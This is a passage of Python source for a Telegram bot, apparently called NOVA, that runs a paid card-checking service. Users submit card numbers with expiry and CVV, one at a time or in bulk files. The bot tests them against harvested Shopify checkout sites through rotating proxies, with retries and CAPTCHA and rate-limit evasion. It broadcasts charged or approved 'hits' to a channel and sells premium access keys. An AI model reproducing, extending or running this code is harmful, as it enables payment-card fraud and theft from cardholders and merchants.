        f"💎 {bs('Testing')} <code>{len(to_test)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"))
    await _run_site_tests(event, uid, to_test, status_msg,
                          initial_sites_count=len(new_sites),
                          existing=existing, wipe=False)


@client.on(events.NewMessage(pattern=r'^[/.]resetsites$'))
async def cmd_resetsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /resetsites</code>\n"
            f"⚠️ {bs('Wipes current list first!')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    save_sites([])
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Reset + testing')} <code>{len(new_sites)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"))
    await _run_site_tests(event, uid, new_sites, status_msg,
                          initial_sites_count=len(new_sites),
                          existing=None, wipe=True)


@client.on(events.NewMessage(pattern=r'^[/.]site$'))
async def cmd_site(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('sites.txt empty')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Purging')} <code>{len(sites)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"))
    await _run_site_tests(event, uid, sites, status_msg,
                          initial_sites_count=len(sites),
                          existing=None, wipe=True)


@client.on(events.NewMessage(pattern=r'^[/.]rm\s+'))
async def cmd_rm(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <code>• /rm site.com</code> {bs('or')} <code>• /rm all</code>"))
    arg = parts[1].strip().lower()
    sites = load_sites()
    if arg == "all":
        save_sites([])
        return await styled_reply(event, pe(
            f"✅ <b>{bs('Cleared')}</b> <code>{len(sites)}</code>"))
    target = normalize_site_url(arg)
    found = next((s for s in sites if normalize_site_url(s) == target), None)
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not found')}</b>"))
    sites = [s for s in sites if s != found]
    save_sites(sites)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b>\n🌐 <code>{found}</code>\n📁 <code>{len(sites)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getsites$'))
async def cmd_getsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    fname = f"NOVA_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for s in sites:
                await f.write(s + "\n")
        await send_file_entities(uid, fname,
            pe(f"📁 {bs('Sites')} (<code>{len(sites)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setthreshold\s+'))
async def cmd_setthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /setthreshold 7</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_threshold(val)
    await styled_reply(event, pe(f"✅ {bs('Max price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getthreshold$'))
async def cmd_getthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(f"💰 {bs('Max price')}: <code>${get_threshold()}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setminprice\s+'))
async def cmd_setminprice(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /setminprice 0.01</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_min_price(val)
    await styled_reply(event, pe(f"✅ {bs('Min price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getminprice$'))
async def cmd_getminprice(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(f"💰 {bs('Min price')}: <code>${get_min_price()}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]sitestats$'))
async def cmd_sitestats(event):
    if event.sender_id not in ADMIN_ID:
        return
    snap = _site_fetcher.snapshot()
    st = snap.get("stats") or {}
    top = snap.get("top") or []
    top_lines = "\n".join(f"✅ <code>{u[:48]}</code>" for u in top[:10]) or f"<i>{bs('empty')}</i>"
    await styled_reply(event, pe(
        f"📊 <b>{bs('Site Pool')}</b>\n{SEP}\n"
        f"🌐 {bs('Pool size')}: <code>{snap.get('count', 0)}</code>\n"
        f"🚫 {bs('Captcha')}: <code>{snap.get('captcha_count', 0)}</code>\n"
        f"💰 {bs('Price range')}: <code>${snap.get('min_price', 0):.2f}–${snap.get('max_price', 0):.2f}</code>\n"
        f"🔄 {bs('Interval')}: <code>{snap.get('harvest_interval', 0)}s</code>\n"
        f"{SEP}\n"
        f"📈 {bs('Cycles')}: <code>{st.get('cycles', 0)}</code>\n"
        f"🔍 {bs('Kept')}: <code>{st.get('candidates_kept', 0)}</code>\n"
        f"🗑 {bs('Dropped')}: <code>{st.get('candidates_dropped', 0)}</code>\n"
        f"⏱ {bs('Rate-limited')}: <code>{st.get('rate_limited', 0)}</code>\n"
        f"{SEP}\n"
        f"🔝 {bs('Top 10')}:\n{top_lines}"))


@client.on(events.NewMessage(pattern=r'^[/.]resetstats$'))
async def cmd_resetstats(event):
    if event.sender_id not in ADMIN_ID:
        return
    n = _site_fetcher.clear_captcha(None)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Captcha list cleared')}</b>\n"
        f"🔓 {bs('Released')}: <code>{n}</code> {bs('sites back into pool')}"))


@client.on(events.NewMessage(pattern=r'^[/.]shscan$'))
async def cmd_shscan(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Harvesting pool')} — {bs('current')} <code>{_site_fetcher.pool_size()}</code>"))
    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(None, _site_fetcher.harvest_once, 200)
    except Exception as e:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvest failed')}</b>: <code>{str(e)[:120]}</code>"))
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Harvest Complete')}</b>\n{SEP}\n"
        f"🔍 {bs('Discovered')}: <code>{result.get('discovered', 0)}</code>\n"
        f"✅ {bs('Added')}: <code>{result.get('added', 0)}</code>\n"
        f"🗑 {bs('Removed')}: <code>{result.get('removed', 0)}</code>\n"
        f"📁 {bs('Pool')}: <code>{result.get('pool', 0)}</code>\n"
        f"🚫 {bs('Captcha')}: <code>{result.get('captcha', 0)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]shharvest(?:\s+(.+))?$'))
async def cmd_shharvest(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    raw = (event.pattern_match.group(1) or "").strip()
    if raw:
        try:
            with open(SITES_FILE, "a", encoding="utf-8") as f:
                for s in raw.split(","):
                    s = s.strip()
                    if s:
                        f.write(s + "\n")
        except Exception:
            pass
    return await cmd_shscan(event)


@client.on(events.NewMessage(pattern=r'^[/.]shstat$'))
async def cmd_shstat(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    snap = _site_fetcher.snapshot()
    st = snap.get("stats") or {}
    body = f"🛒 <b>{bs('Shopify Sites')}</b>\n{SEP}\n"
    body += f"📁 {bs('Pool')}: <code>{snap.get('count', 0)}</code>\n"
    body += f"🚫 {bs('Captcha')}: <code>{snap.get('captcha_count', 0)}</code>\n"
    body += f"🔄 {bs('Cycles')}: <code>{st.get('cycles', 0)}</code>\n"
    body += f"{SEP}\n"
    body += f"💡 <code>• /shscan</code> — harvest pool\n"
    body += f"💡 <code>• /shharvest myshop,coffee</code> — add seeds\n"
    await styled_reply(event, pe(body))


# ---------- /sh / engine / mass ----------
@client.on(events.NewMessage(pattern=r'^[/.]sh\s+'))
async def cmd_sh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    if uid not in ADMIN_ID and is_premium(uid):
        ulimit = get_premium_daily_limit(uid)
        if ulimit > 0:
            used = get_premium_daily_used(uid)
            if used >= ulimit:
                return await styled_reply(event, pe(
                    f"⚠️ <b>{bs('Daily limit reached')}</b>\n{SEP}\n"
                    f"Used: <code>{used}/{ulimit}</code>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Syntax')}</b>\n"
            f"└─ <code>• /sh card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    sem = get_user_sem(uid, "sp")
    try:
        async with sem:
            result, proxy_used = await check_card_with_retry(
                card, sites, proxies, max_retries=2,
                rotator=rotator)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_shopify_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if uid not in ADMIN_ID and is_premium(uid):
            inc_premium_daily_used(uid)
        try:
            _db.log_check(uid, card.split("|")[0][-4:],
                          status, result.get("gateway", "Shopify"),
                          result.get("site", ""),
                          result.get("message", ""),
                          result.get("price", "-"))
        except Exception:
            pass
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
                asyncio.create_task(_process_referral_payout(uid))
                asyncio.create_task(_process_streak_update(uid))
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name,
                                                   "Shopify", video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('message', ''),
                result.get('gateway', 'Shopify'),
                result.get('price', '-'),
                user_mention=f"@{username}" if username else name,
                user_id=uid, gateway_type="Shopify",
                site=result.get('site'), proxy_used=proxy_used,
                video_path=video_path))
        else:
            await edit_entities(status_msg, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                                   parse_mode='html')
        except Exception:
            pass


async def check_card_shopify(card: str, site: str, proxy: str = None):
    if proxy:
        proxy = _strip_country_from_proxy(proxy)
    parts = card.split('|')
    if len(parts) != 4:
        return {'status': 'Dead', 'message': 'Invalid format',
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'CARD_INVALID',
                'retryable': False}, proxy
    proxy_url = proxy_to_url(proxy) if proxy else ""
    site_clean = re.sub(r'^https?://', '', site).rstrip('/')
    if not site_clean.startswith(('http://', 'https://')):
        site_clean = 'https://' + site_clean
    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(
            None, run_shopify_check, site_clean, card, proxy_url
        )
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'Error', 'message': str(e)[:120],
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'EXCEPTION',
                'retryable': True}, proxy
    result['site'] = site
    return result, proxy


async def check_card_with_retry(card: str, sites: list, proxies: list,
                                max_retries: int = 2, rotator=None):
    if not sites:
        return {'status': 'Error', 'message': 'No sites', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None
    if not proxies:
        return {'status': 'Error', 'message': 'No proxies', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None
    rotator = rotator or SmartRotator()
    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None
    for attempt in range(max_retries):
        site = _site_fetcher.pick_site(exclude=tried_sites)
        if not site:
            tried_sites.clear()
            site = _site_fetcher.pick_site()
        if not site:
            break
        tried_sites.add(site)
        proxy = await _pick_smart_proxy(card, proxies)
        if not proxy or proxy in tried_proxies:
            proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy
        try:
            result, used_proxy = await asyncio.wait_for(
                check_card_shopify(card, site, proxy),
                timeout=SHOPIFY_SINGLE_TIMEOUT,
            )
        except asyncio.TimeoutError:
            result = {'status': 'Error', 'message': 'timeout',
                      'card': card, 'site': site, 'gateway': 'Shopify',
                      'price': '-', 'price_value': 0.0,
                      'proxy': proxy, 'status_code': 'TIMEOUT',
                      'retryable': True}
            used_proxy = proxy
        except Exception as e:
            result = {'status': 'Error', 'message': str(e)[:100],
                      'card': card, 'site': site, 'gateway': 'Shopify',
                      'price': '-', 'price_value': 0.0,
                      'proxy': proxy, 'status_code': 'EXCEPTION',
                      'retryable': True}
            used_proxy = proxy
        last_proxy = used_proxy or last_proxy
        last_result = result
        status = result.get('status', 'Dead')
        retryable = result.get('retryable', False)
        msg = (result.get('message') or '').lower()
        try:
            _site_report(site, status)
        except Exception:
            pass
        if status in ('Charged', 'Approved', '3DS'):
            return result, last_proxy
        if status == 'Dead' and not retryable:
            return result, last_proxy
        if 'no variant' in msg:
            return result, last_proxy
        if '429' in msg or 'rate limit' in msg or 'throttl' in msg:
            await asyncio.sleep(10 + random.random() * 5)
        else:
            await asyncio.sleep(0)
    return last_result or {'status': 'Error', 'message': 'All attempts failed',
                           'card': card, 'gateway': 'Unknown',
                           'price': '-', 'price_value': 0.0,
                           'retryable': True}, last_proxy


async def start_mass_shopify(user_id: int, cards: list, event, status_msg):
    sites = load_sites()
    if not sites:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No sites')}</b>"))
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Shopify',
    }
    user_sem = get_user_sem(user_id, "msp")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]
    cached_sites = sites
    cached_proxies = proxies
    last_refresh = [0]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            nonlocal cached_sites, cached_proxies
            async with user_sem:
                if results['checked'] - last_refresh[0] >= 50:
                    cached_sites = load_sites()
                    cached_proxies = load_user_proxies(user_id)
                    last_refresh[0] = results['checked']
                if not cached_sites or not cached_proxies:
                    break
                result, proxy_used = await check_card_with_retry(
                    card, cached_sites, cached_proxies, max_retries=2,
                    rotator=rotator)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('message') or '')[:50]
            results['last_price'] = result.get('price', '-')
            results['last_gateway'] = result.get('gateway', 'Shopify')
            status = result.get('status', 'Dead')
            try:
                _db.log_check(
                    user_id, card.split("|")[0][-4:], status,
                    result.get("gateway", "Shopify"),
                    result.get("site", ""),
                    result.get("message", ""),
                    result.get("price", "-"),
                )
            except Exception:
                pass
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                    asyncio.create_task(_process_milestone_payout(user_id))
                    asyncio.create_task(_process_streak_update(user_id))
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name,
                                                       "Shopify", video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('message', ''),
                    result.get('gateway', 'Shopify'),
                    result.get('price', '-'),
                    user_mention=f"@{username}" if username else name,
                    user_id=user_id, gateway_type="Shopify",
                    site=result.get('site'), proxy_used=proxy_used,
                    video_path=video_path))
            elif status == 'Error':
                results['errors'].append(result)
            else:
                results['dead'].append(result)
            queue.task_done()
            await asyncio.sleep(0)
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results,
                                              results['checked'], "Shopify")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MSP_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results,
                                  results['checked'], "Shopify")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        SHOPIFY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "Shopify")
        ACTIVE_SESSIONS.pop(session_key, None)
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        SHOPIFY_RESULTS.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"^stop_(\d+)$"))
async def cb_stop(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not yours!", alert=True)
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    await event.answer(f"Stopped {stopped}", alert=True)


@client.on(events.NewMessage(pattern=r'^[/.]stop$'))
async def cmd_stop(event):
    uid = event.sender_id
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    if stopped:
        await styled_reply(event, pe(f"🛑 {bs('Stopped')} {stopped} {bs('session(s)')}"))
    else:
        await styled_reply(event, pe(f"⚠️ {bs('No active session')}"))


@client.on(events.NewMessage(pattern=r'^[/.]msh$'))
async def cmd_msh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /msh</code>\n"
            f"📋 {bs('Max')}: "
            f"<code>{MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM}</code> "
            f"{bs('cards per file')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    HARD_CAP = MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM
    user_limit = get_cc_limit(uid)
    limit = min(user_limit, HARD_CAP) if user_limit else HARD_CAP
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(
            f"⚠️ <b>{bs('File trimmed')}</b>\n{SEP}\n"
            f"📋 {bs('Limit')}: <code>{limit}</code> {bs('cards')}"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Starting Shopify mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_shopify(uid, cards, event, status_msg))


async def _export_category(event, user_id: int, gateway: str, category: str):
    if event.sender_id != user_id:
        return await event.answer("Not your results!", alert=True)
    results = SHOPIFY_RESULTS.get(user_id)
    if not results:
        return await event.answer("Results expired", alert=True)
    items = results.get(category, [])
    if not items:
        return await event.answer(f"No {category} cards", alert=True)
    fname = f"NOVA_{category.upper()}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        _write_result_file(fname, f"{category.upper()} CARDS", items, gateway)
        await send_file_entities(
            user_id, fname,
            pe(f"✅ {bs(category.capitalize())} ({len(items)})"))
        os.remove(fname)
    except Exception as e:
        log_system("EXPORT", f"failed: {e}", "error")
    await event.answer("Sent!", alert=False)


@client.on(events.CallbackQuery(pattern=rb"^(shopify|razorpay)_export_(charged|approved|3ds|errors):(\d+)$"))
async def cb_export(event):
    m = event.pattern_match
    gateway = m.group(1).decode()
    category = m.group(2).decode()
    user_id = int(m.group(3).decode())
    await _export_category(event, user_id, gateway, category)


# ---------- Keys / premium / admin ----------
@client.on(events.NewMessage(pattern=r'^[/.]genkeys\s+'))
async def cmd_genkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 5:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n"
            f"<code>• /genkeys count hours max_users cc_limit [price]</code>\n"
            f"{SEP}\n"
            f"💡 <code>• /genkeys 5 24 1 1500 10</code>"))
    try:
        count = int(parts[1]); hours = int(parts[2])
        max_users = int(parts[3]); cc_limit = int(parts[4])
        price = float(parts[5]) if len(parts) > 5 else 0.0
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid numbers')}</b>"))
    if count < 1 or count > 100:
        return await styled_reply(event, pe(f"💎 <b>{bs('Count 1-100')}</b>"))
    keys_data = load_keys()
    now = datetime.now()
    expiry = (now + timedelta(hours=hours)).isoformat()
    generated = []
    for _ in range(count):
        key = generate_key()
        while key in keys_data:
            key = generate_key()
        keys_data[key] = {
            "hours": hours, "max_users": max_users, "cc_limit": cc_limit,
            "price": price, "created_at": now.isoformat(),
            "created_by": event.sender_id,
            "expiry": expiry, "used_by": [], "used_count": 0,
        }
        generated.append(key)
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    price_disp = f"${price:.2f}" if price else "Free"
    text = pe(f"""⭐ <b>{bs('Keys generated')}</b>  (x{count})
{SEP}
""" + "\n".join(f"┣ <code>{k}</code>" for k in generated) + f"""
{SEP}
📅 {bs('Valid')}: {hours_disp}
👥 {bs('Users per key')}: {max_users}
💳 {bs('CC limit')}: {cc_limit}
💰 {bs('Price')}: {price_disp}
⏰ {bs('Key expires')}: {expiry[:16]}

✅ {bs('Redeem with')} <code>• /redeem KEY</code>""")
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]redeem\s+'))
async def cmd_redeem(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /redeem NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        await send_redeem_log(uid, key, "❌ Invalid Key", "Key not found")
        return await styled_reply(event, pe(
            f"❌ <b>{bs('Invalid key')}</b>\n🔐 <code>{key}</code>"))
    entry = keys_data[key]
    now = datetime.now()
    try:
        if now > datetime.fromisoformat(entry.get('expiry', '')):
            await send_redeem_log(uid, key, "❌ Expired", "Key past expiry")
            return await styled_reply(event, pe(f"❌ <b>{bs('Key expired')}</b>"))
    except Exception:
        pass
    used_by = entry.get('used_by', [])
    max_users = int(entry.get('max_users', 1))
    if uid in used_by:
        await send_redeem_log(uid, key, "❌ Already Used", f"user {uid}")
        return await styled_reply(event, pe(f"❌ <b>{bs('Already used')}</b>"))
    if len(used_by) >= max_users:
        await send_redeem_log(uid, key, "❌ Max Users", f"{len(used_by)}/{max_users}")
        return await styled_reply(event, pe(
            f"❌ <b>{bs('Key max users reached')}</b>\n"
            f"👥 <code>{len(used_by)}/{max_users}</code>"))
    if is_premium(uid):
        await send_redeem_log(uid, key, "❌ Already Premium", "user already premium")
        return await styled_reply(event, pe(f"❌ <b>{bs('Already premium')}</b>"))
    hours = int(entry.get('hours', DEFAULT_KEY_HOURS))
    cc_limit = int(entry.get('cc_limit', DEFAULT_KEY_CC_LIMIT))
    _db.add_premium(uid, hours=hours, cc_limit=cc_limit)
    entry['used_by'] = used_by + [uid]
    entry['used_count'] = int(entry.get('used_count', 0)) + 1
    keys_data[key] = entry
    save_keys(keys_data)
    user_expiry = (now + timedelta(hours=hours)).timestamp()
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    await send_redeem_log(uid, key, "✅ Success", f"Activated for {hours_disp}")
    await styled_reply(event, pe(
        f"🎉 <b>{bs('Premium activated')}</b>\n{SEP}\n"
        f"📅 {bs('Duration')}: <code>{hours_disp}</code>\n"
        f"💳 {bs('CC limit')}: <code>{cc_limit}</code>\n"
        f"⏰ {bs('Expires')}: <code>{datetime.fromtimestamp(user_expiry).strftime('%Y-%m-%d %H:%M')}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]listkeys$'))
async def cmd_listkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    keys_data = load_keys()
    if not keys_data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No keys')}</b>"))
    now = datetime.now()
    lines = []
    for k, v in list(keys_data.items())[:50]:
        hours = v.get('hours', '?')
        used = v.get('used_count', 0); maxu = v.get('max_users', 1)
        expiry = v.get('expiry', '')[:16]
        status = "✅" if now.isoformat() < expiry else "❌"
        lines.append(f"{status} <code>{k}</code>\n    {hours}h · {used}/{maxu} · exp {expiry}")
    extra = f"\n<i>+{len(keys_data)-50} more</i>" if len(keys_data) > 50 else ""
    await styled_reply(event, pe(
        f"🔑 <b>{bs('Keys')}</b> (<code>{len(keys_data)}</code>)\n"
        f"{SEP}\n" + "\n".join(lines) + extra))


@client.on(events.NewMessage(pattern=r'^[/.]delkey\s+'))
async def cmd_delkey(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /delkey NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        return await styled_reply(event, pe(f"❌ <b>{bs('Not found')}</b>"))
    del keys_data[key]
    save_keys(keys_data)
    await styled_reply(event, pe(f"✅ <b>{bs('Deleted')}</b> <code>{key}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addpremium\s+'))
async def cmd_addpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <code>• /addpremium user_id [days] [cc_limit]</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    days = int(parts[2]) if len(parts) > 2 else 0
    cc_limit = int(parts[3]) if len(parts) > 3 else 100000
    if days > 0:
        _db.add_premium(target, hours=days * 24, cc_limit=cc_limit)
        exp = (datetime.now() + timedelta(days=days)).timestamp()
        exp_str = datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M')
    else:
        _db.add_premium(target, hours=24 * 365 * 100, cc_limit=cc_limit)
        exp_str = "Permanent"
    await styled_reply(event, pe(
        f"✅ <b>{bs('Premium added')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"⏰ <code>{exp_str}</code>\n"
        f"💳 CC <code>{cc_limit}</code>"))
    try:
        await send_entities(target,
            pe(f"🎉 <b>{bs('Premium activated')}</b>\n⏰ <code>{exp_str}</code>"))
    except Exception:
        pass


@client.on(events.NewMessage(pattern=r'^[/.]removepremium\s+'))
async def cmd_removepremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
